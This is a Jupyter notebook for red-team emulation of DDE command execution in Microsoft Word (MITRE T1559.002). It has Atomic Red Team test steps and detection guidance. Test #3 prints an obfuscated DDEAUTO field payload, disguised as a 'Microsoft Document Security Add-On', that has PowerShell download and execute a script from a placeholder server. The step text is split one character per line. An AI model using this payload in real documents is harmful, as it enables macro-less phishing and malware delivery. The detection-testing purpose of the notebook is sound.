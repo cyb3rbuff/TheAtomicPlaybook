{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# T1559.002 - Inter-Process Communication: Dynamic Data Exchange",
    "\n",
    "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Atomic Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Import the Module before running the tests.\nImport-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Execute Commands\nExecutes commands via DDE using Microsfot Word\n\n**Supported Platforms:** windows\nRun it with these steps!\nO\np\ne\nn\n \nM\ni\nc\nr\no\ns\no\nf\nt\n \nW\no\nr\nd\n\n\n\n\nI\nn\ns\ne\nr\nt\n \nt\na\nb\n \n-\n>\n \nQ\nu\ni\nc\nk\n \nP\na\nr\nt\ns\n \n-\n>\n \nF\ni\ne\nl\nd\n\n\n\n\nC\nh\no\no\ns\ne\n \n=\n \n(\nF\no\nr\nm\nu\nl\na\n)\n \na\nn\nd\n \nc\nl\ni\nc\nk\n \no\nk\n.\n\n\n\n\nA\nf\nt\ne\nr\n \nt\nh\na\nt\n,\n \ny\no\nu\n \ns\nh\no\nu\nl\nd\n \ns\ne\ne\n \na\n \nF\ni\ne\nl\nd\n \ni\nn\ns\ne\nr\nt\ne\nd\n \ni\nn\n \nt\nh\ne\n \nd\no\nc\nu\nm\ne\nn\nt\n \nw\ni\nt\nh\n \na\nn\n \ne\nr\nr\no\nr\n \n\"\n!\nU\nn\ne\nx\np\ne\nc\nt\ne\nd\n \nE\nn\nd\n \no\nf\n \nF\no\nr\nm\nu\nl\na\n\"\n,\n \nr\ni\ng\nh\nt\n-\nc\nl\ni\nc\nk\n \nt\nh\ne\n \nF\ni\ne\nl\nd\n,\n \na\nn\nd\n \nc\nh\no\no\ns\ne\n \nT\no\ng\ng\nl\ne\n \nF\ni\ne\nl\nd\n \nC\no\nd\ne\ns\n.\n\n\n\n\nT\nh\ne\n \nF\ni\ne\nl\nd\n \nC\no\nd\ne\n \ns\nh\no\nu\nl\nd\n \nn\no\nw\n \nb\ne\n \nd\ni\ns\np\nl\na\ny\ne\nd\n,\n \nc\nh\na\nn\ng\ne\n \ni\nt\n \nt\no\n \nC\no\nn\nt\na\ni\nn\n \nt\nh\ne\n \nf\no\nl\nl\no\nw\ni\nn\ng\n:\n\n\n\n\n{\nD\nD\nE\nA\nU\nT\nO\n \nc\n:\n\\\n\\\nw\ni\nn\nd\no\nw\ns\n\\\n\\\ns\ny\ns\nt\ne\nm\n3\n2\n\\\n\\\nc\nm\nd\n.\ne\nx\ne\n \n\"\n/\nk\n \nc\na\nl\nc\n.\ne\nx\ne\n\"\n \n \n}\n\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Execute PowerShell script via Word DDE\nWhen the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n\n**Supported Platforms:** windows\n#### Attack Commands: Run with `command_prompt`\n```command_prompt\nstart $PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1559.002 -TestNumbers 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - DDEAUTO\n\nTrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n\n**Supported Platforms:** windows\nRun it with these steps!\n1\n.\n \nO\np\ne\nn\n \nW\no\nr\nd\n\n\n\n\n2\n.\n \nI\nn\ns\ne\nr\nt\n \nt\na\nb\n \n-\n>\n \nQ\nu\ni\nc\nk\n \nP\na\nr\nt\ns\n \n-\n>\n \nF\ni\ne\nl\nd\n\n\n\n\n3\n.\n \nC\nh\no\no\ns\ne\n \n=\n \n(\nF\no\nr\nm\nu\nl\na\n)\n \na\nn\nd\n \nc\nl\ni\nc\nk\n \no\nk\n.\n\n\n\n\n4\n.\n \nO\nn\nc\ne\n \nt\nh\ne\n \nf\ni\ne\nl\nd\n \ni\ns\n \ni\nn\ns\ne\nr\nt\ne\nd\n,\n \ny\no\nu\n \ns\nh\no\nu\nl\nd\n \nn\no\nw\n \ns\ne\ne\n \n\"\n!\nU\nn\ne\nx\np\ne\nc\nt\ne\nd\n \nE\nn\nd\n \no\nf\n \nF\no\nr\nm\nu\nl\na\n\"\n\n\n\n\n5\n.\n \nR\ni\ng\nh\nt\n-\nc\nl\ni\nc\nk\n \nt\nh\ne\n \nF\ni\ne\nl\nd\n,\n \nc\nh\no\no\ns\ne\n \n\"\nT\no\ng\ng\nl\ne\n \nF\ni\ne\nl\nd\n \nC\no\nd\ne\ns\n\"\n\n\n\n\n6\n.\n \nP\na\ns\nt\ne\n \ni\nn\n \nt\nh\ne\n \nc\no\nd\ne\n \nf\nr\no\nm\n \nU\nn\ni\nc\no\nr\nn\n \no\nr\n \nS\ne\nn\ns\ne\nP\no\ns\nt\n\n\n\n\n7\n.\n \nS\na\nv\ne\n \nt\nh\ne\n \nW\no\nr\nd\n \nd\no\nc\nu\nm\ne\nn\nt\n.\n\n\n\n\n9\n.\n \nD\nD\nE\nA\nU\nT\nO\n \nc\n:\n\\\n\\\nw\ni\nn\nd\no\nw\ns\n\\\n\\\ns\ny\ns\nt\ne\nm\n3\n2\n\\\n\\\nc\nm\nd\n.\ne\nx\ne\n \n\"\n/\nk\n \nc\na\nl\nc\n.\ne\nx\ne\n\"\n\n\n\n\n1\n0\n.\n \nD\nD\nE\nA\nU\nT\nO\n \n\"\nC\n:\n\\\n\\\nP\nr\no\ng\nr\na\nm\ns\n\\\n\\\nM\ni\nc\nr\no\ns\no\nf\nt\n\\\n\\\nO\nf\nf\ni\nc\ne\n\\\n\\\nM\nS\nW\no\nr\nd\n\\\n\\\n.\n.\n\\\n\\\n.\n.\n\\\n\\\n.\n.\n\\\n\\\n.\n.\n\\\n\\\nw\ni\nn\nd\no\nw\ns\n\\\n\\\ns\ny\ns\nt\ne\nm\n3\n2\n\\\n\\\n{\n \nQ\nU\nO\nT\nE\n \n8\n7\n \n1\n0\n5\n \n1\n1\n0\n \n1\n0\n0\n \n1\n1\n1\n \n1\n1\n9\n \n1\n1\n5\n \n8\n0\n \n1\n1\n1\n \n1\n1\n9\n \n1\n0\n1\n \n1\n1\n4\n \n8\n3\n \n1\n0\n4\n \n1\n0\n1\n \n1\n0\n8\n \n1\n0\n8\n \n}\n\\\n\\\nv\n1\n.\n0\n\\\n\\\n{\n \nQ\nU\nO\nT\nE\n \n1\n1\n2\n \n1\n1\n1\n \n1\n1\n9\n \n1\n0\n1\n \n1\n1\n4\n \n1\n1\n5\n \n1\n0\n4\n \n1\n0\n1\n \n1\n0\n8\n \n1\n0\n8\n \n4\n6\n \n1\n0\n1\n \n1\n2\n0\n \n1\n0\n1\n \n}\n \n-\nw\n \n1\n \n-\nn\no\np\n \n{\n \nQ\nU\nO\nT\nE\n \n1\n0\n5\n \n1\n0\n1\n \n1\n2\n0\n \n}\n(\nN\ne\nw\n-\nO\nb\nj\ne\nc\nt\n \nS\ny\ns\nt\ne\nm\n.\nN\ne\nt\n.\nW\ne\nb\nC\nl\ni\ne\nn\nt\n)\n.\nD\no\nw\nn\nl\no\na\nd\nS\nt\nr\ni\nn\ng\n(\n'\nh\nt\nt\np\n:\n/\n/\n<\ns\ne\nr\nv\ne\nr\n>\n/\nd\no\nw\nn\nl\no\na\nd\n.\np\ns\n1\n'\n)\n;\n \n#\n \n\"\n \n\"\nM\ni\nc\nr\no\ns\no\nf\nt\n \nD\no\nc\nu\nm\ne\nn\nt\n \nS\ne\nc\nu\nr\ni\nt\ny\n \nA\nd\nd\n-\nO\nn\n\"\n\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Detection",
    "\n",
    "Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE and Office Open XML files can be scanned for \u2018DDEAUTO', \u2018DDE\u2019, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}